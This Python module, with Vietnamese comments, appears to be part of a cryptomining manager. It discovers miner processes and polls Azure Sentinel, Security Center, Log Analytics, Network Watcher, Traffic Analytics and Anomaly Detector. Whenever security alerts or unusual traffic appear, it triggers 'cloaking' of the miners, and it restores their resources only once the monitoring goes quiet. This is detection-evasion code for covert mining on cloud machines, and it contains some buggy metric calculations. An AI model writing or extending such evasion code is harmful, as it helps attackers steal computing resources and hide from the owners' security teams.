# anomaly_detector.py
import os
import psutil
import pynvml
import logging
from time import sleep, time
from pathlib import Path
from threading import Lock, Event, Thread
from typing import List, Any, Dict, Optional

from .base_manager import BaseManager
from .utils import MiningProcess

from .auxiliary_modules.power_management import (
    get_cpu_power,
    get_gpu_power
)

from .auxiliary_modules.temperature_monitor import (
    get_cpu_temperature,
    get_gpu_temperature 
)


class SafeRestoreEvaluator:
    """
    Lớp đánh giá điều kiện an toàn để khôi phục tài nguyên cho các tiến trình.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_manager):
        self.config = config
        self.logger = logger
        self.resource_manager = resource_manager

        # Các ngưỡng baseline
        self.baseline_cpu_usage_percent = self.config.get('baseline_thresholds', {}).get('cpu_usage_percent', 80)
        self.baseline_gpu_usage_percent = self.config.get('baseline_thresholds', {}).get('gpu_usage_percent', 80)
        self.baseline_ram_usage_percent = self.config.get('baseline_thresholds', {}).get('ram_usage_percent', 80)
        self.baseline_disk_io_usage_mbps = self.config.get('baseline_thresholds', {}).get('disk_io_usage_mbps', 80)
        self.baseline_network_usage_mbps = self.config.get('baseline_thresholds', {}).get('network_usage_mbps', 80)

        # Giới hạn nhiệt độ
        temperature_limits = self.config.get("temperature_limits", {})
        self.cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
        self.gpu_max_temp = temperature_limits.get("gpu_max_celsius", 85)

        # Giới hạn công suất
        power_limits = self.config.get("power_limits", {})
        self.cpu_max_power = power_limits.get("per_device_power_watts", {}).get("cpu", 150)
        self.gpu_max_power = power_limits.get("per_device_power_watts", {}).get("gpu", 300)

    def is_safe_to_restore(self, process: MiningProcess) -> bool:
        """
        Kiểm tra xem điều kiện có đủ an toàn để khôi phục tài nguyên cho tiến trình không.

        Args:
            process (MiningProcess): Tiến trình cần kiểm tra.

        Returns:
            bool: True nếu an toàn để khôi phục, False nếu không.
        """
        try:
            # Kiểm tra nhiệt độ CPU
            cpu_temp = get_cpu_temperature(process.pid)
            if cpu_temp is not None and cpu_temp >= self.cpu_max_temp:
                self.logger.info(f"Nhiệt độ CPU {cpu_temp}°C vẫn cao cho tiến trình {process.name} (PID: {process.pid}).")
                return False

            # Kiểm tra nhiệt độ GPU
            if self.resource_manager.shared_resource_manager.is_gpu_initialized():
                gpu_temps = get_gpu_temperature(process.pid)
                if gpu_temps and any(temp >= self.gpu_max_temp for temp in gpu_temps):
                    self.logger.info(f"Nhiệt độ GPU {gpu_temps}°C vẫn cao cho tiến trình {process.name} (PID: {process.pid}).")
                    return False

            # Kiểm tra công suất CPU
            cpu_power = get_cpu_power(process.pid)
            if cpu_power is not None and cpu_power >= self.cpu_max_power:
                self.logger.info(f"Công suất CPU {cpu_power}W vẫn cao cho tiến trình {process.name} (PID: {process.pid}).")
                return False

            # Kiểm tra công suất GPU
            if self.resource_manager.shared_resource_manager.is_gpu_initialized():
                gpu_power = get_gpu_power(process.pid)
                if gpu_power is not None and gpu_power >= self.gpu_max_power:
                    self.logger.info(f"Công suất GPU {gpu_power}W vẫn cao cho tiến trình {process.name} (PID: {process.pid}).")
                    return False

            # Kiểm tra sử dụng CPU tổng thể
            total_cpu_usage = psutil.cpu_percent(interval=1)
            if total_cpu_usage >= self.baseline_cpu_usage_percent:
                self.logger.info(f"Sử dụng CPU tổng thể {total_cpu_usage}% vẫn cao.")
                return False

            # Kiểm tra sử dụng RAM tổng thể
            ram = psutil.virtual_memory()
            total_ram_usage_percent = ram.percent
            if total_ram_usage_percent >= self.baseline_ram_usage_percent:
                self.logger.info(f"Sử dụng RAM tổng thể {total_ram_usage_percent}% vẫn cao.")
                return False

            # Kiểm tra sử dụng Disk I/O
            disk_io_counters = psutil.disk_io_counters()
            total_disk_io_usage_mbps = (disk_io_counters.read_bytes + disk_io_counters.write_bytes) / (1024 * 1024)
            if total_disk_io_usage_mbps >= self.baseline_disk_io_usage_mbps:
                self.logger.info(f"Sử dụng Disk I/O tổng thể {total_disk_io_usage_mbps:.2f} MBps vẫn cao.")
                return False

            # Kiểm tra sử dụng băng thông mạng
            net_io_counters = psutil.net_io_counters()
            total_network_usage_mbps = (net_io_counters.bytes_sent + net_io_counters.bytes_recv) / (1024 * 1024)
            if total_network_usage_mbps >= self.baseline_network_usage_mbps:
                self.logger.info(f"Sử dụng băng thông mạng tổng thể {total_network_usage_mbps:.2f} MBps vẫn cao.")
                return False

            # Kiểm tra cảnh báo từ Azure Sentinel
            alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=1)
            if alerts:
                self.logger.info(f"Vẫn còn {len(alerts)} cảnh báo từ Azure Sentinel.")
                return False

            # Kiểm tra logs từ Azure Log Analytics
            for vm in self.resource_manager.vms:
                query = f"Heartbeat | where Computer == '{vm['name']}' | summarize AggregatedValue = avg(CPUUsage) by bin(TimeGenerated, 5m)"
                logs = self.resource_manager.azure_log_analytics_client.query_logs(query)
                if logs:
                    self.logger.info(f"Vẫn còn logs bất thường từ Azure Log Analytics cho VM {vm['name']}.")
                    return False

            # Kiểm tra khuyến nghị từ Azure Security Center
            recommendations = self.resource_manager.azure_security_center_client.get_security_recommendations()
            if recommendations:
                self.logger.info(f"Vẫn còn {len(recommendations)} khuyến nghị bảo mật từ Azure Security Center.")
                return False

            # Kiểm tra lưu lượng từ Azure Traffic Analytics
            traffic_data = self.resource_manager.azure_traffic_analytics_client.get_traffic_data()
            if traffic_data:
                self.logger.info(f"Vẫn còn lưu lượng bất thường từ Azure Traffic Analytics.")
                return False

            # Kiểm tra bất thường thông qua Azure Anomaly Detector
            current_state = self.resource_manager.collect_metrics(process)
            anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)

            if anomalies_detected:
                self.logger.info(f"Azure Anomaly Detector phát hiện bất thường cho tiến trình {process.name} (PID: {process.pid}).")
                return False

            # Nếu tất cả các kiểm tra đều vượt qua, an toàn để khôi phục
            self.logger.info(f"Điều kiện an toàn để khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}).")
            return True
        except Exception as e:
                self.logger.error(f"Xảy ra lỗi: {str(e)}")

class AnomalyDetector(BaseManager):
    """
    Lớp phát hiện bất thường, giám sát baseline và áp dụng cloaking khi cần thiết.
    Kế thừa từ BaseManager để sử dụng các phương thức chung.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(AnomalyDetector, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        super().__init__(config, logger)
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        # Cấu hình
        self.logger = logger
        self.config = config

        # Sự kiện để dừng các luồng
        self.stop_event = Event()

        # Danh sách tiến trình khai thác
        self.mining_processes = []
        self.mining_processes_lock = Lock()

        # Khởi tạo luồng phát hiện bất thường
        self.anomaly_thread = Thread(target=self.anomaly_detection, name="AnomalyDetectionThread", daemon=True)

        # Initialize NVML once
        try:
            pynvml.nvmlInit()
            self.gpu_initialized = True
            self.logger.info("NVML initialized successfully.")
        except pynvml.NVMLError as e:
            self.logger.error(f"Failed to initialize NVML: {e}")
            self.gpu_initialized = False

        # Trì hoãn việc import ResourceManager để tránh phụ thuộc vòng
        self.resource_manager = None

        # Khởi tạo SafeRestoreEvaluator
        self.safe_restore_evaluator = None  # Sẽ được khởi tạo sau khi ResourceManager được thiết lập

    def set_resource_manager(self, resource_manager):
        """
        Thiết lập ResourceManager sau khi đã khởi tạo toàn bộ hệ thống.
        """
        self.resource_manager = resource_manager
        self.logger.info("ResourceManager has been set for AnomalyDetector.")

        # Khởi tạo SafeRestoreEvaluator
        self.safe_restore_evaluator = SafeRestoreEvaluator(
            self.config,
            self.logger,
            self.resource_manager
        )

    def start(self):
        self.logger.info("Starting AnomalyDetector...")
        self.anomaly_thread.start()
        self.logger.info("AnomalyDetector started successfully.")

    def stop(self):
        self.logger.info("Stopping AnomalyDetector...")
        self.stop_event.set()
        self.anomaly_thread.join()
        if self.gpu_initialized:
            try:
                pynvml.nvmlShutdown()
                self.logger.info("NVML shutdown successfully.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Failed to shutdown NVML: {e}")
        self.logger.info("AnomalyDetector stopped successfully.")

    def discover_mining_processes(self):
        """
        Phát hiện các tiến trình khai thác dựa trên cấu hình từ tệp cấu hình.
        """
        cpu_process_name = self.config['processes']['CPU'].lower()
        gpu_process_name = self.config['processes']['GPU'].lower()

        with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                proc_name = proc.info['name'].lower()
                if cpu_process_name in proc_name or gpu_process_name in proc_name:
                    priority = self.get_process_priority(proc.info['name'])
                    network_interface = self.config.get('network_interface', 'eth0')
                    mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], priority, network_interface, self.logger)
                    # Thêm thuộc tính is_cloaked cho tiến trình
                    mining_proc.is_cloaked = False
                    self.mining_processes.append(mining_proc)
            self.logger.info(f"Discovered {len(self.mining_processes)} mining processes.")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy mức độ ưu tiên của tiến trình từ cấu hình.
        """
        priority_map = self.config.get('process_priority_map', {})
        return priority_map.get(process_name.lower(), 1)

    def anomaly_detection(self):
        """
        Luồng phát hiện bất thường và gửi yêu cầu cloaking nếu cần.
        """
        detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 60)
        cloak_activation_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
        last_detection_time = 0

        while not self.stop_event.is_set():
            current_time = time()
            if current_time - last_detection_time < detection_interval:
                sleep(1)
                continue

            last_detection_time = current_time

            try:
                self.discover_mining_processes()

                if self.resource_manager is None:
                    self.logger.error("ResourceManager is not set. Cannot proceed with anomaly detection.")
                    continue

                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        process.update_resource_usage()
                        current_state = self.resource_manager.collect_metrics(process)

                        # Kiểm tra các dịch vụ Azure đã tích hợp
                        anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)

                        if anomalies_detected:
                            self.logger.warning(f"Anomaly detected in process {process.name} (PID: {process.pid}) via Azure Anomaly Detector. Initiating cloaking in {cloak_activation_delay} seconds.")
                            sleep(cloak_activation_delay)
                            self.resource_manager.cloaking_request_queue.put(process)
                            process.is_cloaked = True
                            continue

                        # Kiểm tra các cảnh báo từ Azure Sentinel
                        alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=1)
                        if alerts:
                            self.logger.warning(f"Detected {len(alerts)} alerts from Azure Sentinel for PID: {process.pid}")
                            self.resource_manager.cloaking_request_queue.put(process)
                            process.is_cloaked = True
                            continue  # Cloak immediately

                        # Kiểm tra logs từ Azure Log Analytics
                        for vm in self.resource_manager.vms:
                            query = f"Heartbeat | where Computer == '{vm['name']}' | summarize AggregatedValue = avg(CPUUsage) by bin(TimeGenerated, 5m)"
                            logs = self.resource_manager.azure_log_analytics_client.query_logs(query)
                            if logs:
                                self.logger.warning(f"Detected logs từ Azure Log Analytics cho VM {vm['name']}.")
                                self.resource_manager.cloaking_request_queue.put(process)
                                process.is_cloaked = True
                                break  # Cloak immediately

                        # Kiểm tra khuyến nghị từ Azure Security Center
                        recommendations = self.resource_manager.azure_security_center_client.get_security_recommendations()
                        if recommendations:
                            self.logger.warning(f"Detected {len(recommendations)} security recommendations từ Azure Security Center.")
                            self.resource_manager.cloaking_request_queue.put(process)
                            process.is_cloaked = True
                            continue

                        # Kiểm tra lưu lượng từ Azure Network Watcher
                        for nsg in self.resource_manager.nsgs:
                            flow_logs = self.resource_manager.azure_network_watcher_client.get_flow_logs(
                                resource_group=nsg['resourceGroup'],
                                network_watcher_name=self.resource_manager.network_watchers[0]['name'] if self.resource_manager.network_watchers else 'unknown',
                                nsg_name=nsg['name']
                            )
                            if flow_logs:
                                self.logger.warning(f"Detected flow logs từ Azure Network Watcher cho NSG {nsg['name']}.")
                                self.resource_manager.cloaking_request_queue.put(process)
                                process.is_cloaked = True
                                break

                        # Kiểm tra lưu lượng từ Azure Traffic Analytics
                        traffic_data = self.resource_manager.azure_traffic_analytics_client.get_traffic_data()
                        if traffic_data:
                            self.logger.warning(f"Detected traffic anomalies từ Azure Traffic Analytics cho PID: {process.pid}")
                            self.resource_manager.cloaking_request_queue.put(process)
                            process.is_cloaked = True
                            continue

            except Exception as e:
                self.logger.error(f"Error in anomaly_detection: {e}")
            sleep(1)  # Sleep briefly to prevent tight loop

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập các chỉ số tài nguyên của tiến trình.
        """
        try:
            proc = psutil.Process(process.pid)
            current_state = {
                'cpu_percent': proc.cpu_percent(interval=1),
                'cpu_count': psutil.cpu_count(logical=True),
                'cpu_freq_mhz': self.get_cpu_freq(),
                'ram_percent': proc.memory_percent(),
                'ram_total_mb': psutil.virtual_memory().total / (1024 * 1024),
                'ram_available_mb': psutil.virtual_memory().available / (1024 * 1024),
                'cache_percent': self.get_cache_percent(),
                'gpus': [
                    {
                        'gpu_percent': self.get_gpu_memory_percent(process.pid),
                        'memory_percent': self.get_gpu_memory_percent(process.pid),
                        'temperature_celsius': self.get_gpu_temperature(process.pid)
                    }
                ],
                'disk_io_limit_mbps': proc.io_counters().read_bytes + proc.io_counters().write_bytes / (1024 * 1024),
                'network_bandwidth_limit_mbps': self.config.get('resource_allocation', {}).get('network', {}).get('bandwidth_limit_mbps', 100),
                'cpu_power_watts': get_cpu_power(process.pid),
                'gpu_power_watts': get_gpu_power(process.pid) if self.gpu_initialized else 0
            }
            self.logger.debug(f"Collected metrics for process {process.name} (PID: {process.pid}): {current_state}")
            return current_state
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không còn tồn tại.")
            return {}
        except Exception as e:
            self.logger.error(f"Lỗi khi thu thập metrics cho tiến trình {process.name} (PID: {process.pid}): {e}")
            return {}

    def get_cpu_freq(self) -> Optional[float]:
        """
        Lấy tần số CPU hiện tại của hệ thống.
        """
        try:
            freq = psutil.cpu_freq().current  # Tần số CPU hiện tại trên toàn hệ thống
            self.logger.debug(f"Tần số CPU hiện tại: {freq} MHz")
            return freq
        except Exception as e:
            self.logger.error(f"Lỗi khi lấy tần số CPU: {e}")
            return None

    def get_cache_percent(self) -> Optional[float]:
        """
        Lấy phần trăm Cache hiện tại của hệ thống.
        """
        try:
            mem = psutil.virtual_memory()
            cache_percent = mem.cached / mem.total * 100
            self.logger.debug(f"Cache hiện tại: {cache_percent:.2f}%")
            return cache_percent
        except Exception as e:
            self.logger.error(f"Lỗi khi lấy phần trăm Cache: {e}")
            return None

    def get_gpu_memory_percent(self, pid: Optional[int] = None) -> float:
        """
        Lấy phần trăm bộ nhớ GPU hiện tại.
        """
        if not self.gpu_initialized:
            self.logger.warning("GPU not initialized. Cannot get GPU memory percent.")
            return 0.0

        try:
            gpu_memory_total = 0
            gpu_memory_used = 0
            for i in range(pynvml.nvmlDeviceGetCount()):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                mem_info = pynvml.nvmlDeviceGetMemoryInfo(handle)
                gpu_memory_total += mem_info.total
                gpu_memory_used += mem_info.used
                self.logger.debug(f"GPU {i} Memory Usage: {(mem_info.used / mem_info.total) * 100:.2f}%")
            if gpu_memory_total == 0:
                return 0.0
            return (gpu_memory_used / gpu_memory_total) * 100
        except pynvml.NVMLError as e:
            self.logger.error(f"Error getting GPU memory percent: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Unexpected error getting GPU memory percent: {e}")
            return 0.0

    def get_gpu_temperature(self, pid: Optional[int] = None) -> float:
        """
        Lấy nhiệt độ GPU hiện tại.
        """
        temps = get_gpu_temperature(pid)
        if temps:
            avg_temp = sum(temps) / len(temps)
            self.logger.debug(f"Average GPU Temperature: {avg_temp}°C")
            return avg_temp
        return 0.0
